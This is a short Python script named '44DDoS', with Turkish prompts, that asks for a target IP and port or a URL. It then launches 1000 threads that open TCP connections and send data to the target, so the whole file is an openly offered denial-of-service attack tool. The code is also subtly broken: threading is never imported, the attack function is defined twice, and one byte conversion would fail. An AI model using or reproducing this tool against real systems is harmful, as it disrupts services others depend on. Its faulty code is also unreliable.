import socket
import random
import time

def main():
    
    print("💥💥💥 44DDoS 💥💥💥")

    
    print("1 = IP saldırısı\n2 = URL saldırısı")

    
    saldırı_türü = input("Saldırı türünü seç: ")

    
    if saldırı_türü == "1":
        
        hedef = input("Hedef IP'yi girin: ")
        port = int(input("Hedef portu girin: "))

        
        threads = 1000

        
        for i in range(threads):
            
            t = threading.Thread(target=attack, args=(hedef, port))

    
            t.start()

            
            print("Paket gönderiliyor")

        
        for t in threading.enumerate():
            t.join()

    
    elif saldırı_türü == "2":
        
        hedef_url = input("Hedef URL'yi girin: ")

        
        hedef_paket = input("Hedef paketi girin: ")

        
        threads = 1000

        
        for i in range(threads):
            
            t = threading.Thread(target=attack, args=(hedef_url, hedef_paket))

            
            t.start()

            
            print("Paket gönderiliyor")

        
        for t in threading.enumerate():
            t.join()

    else:
        
        print("Invalid input")

def attack(target, port):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    
    s.connect((target, port))

    
    data = bytes(random.randint(1, 65535), "utf-8")
    s.sendall(data)

    
    s.close()

def attack(target_url, target_packet):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    
    s.connect((target_url, 80))

    
    s.sendall(target_packet.encode())

    
    s.close()

if __name__ == "__main__":
    main()
                
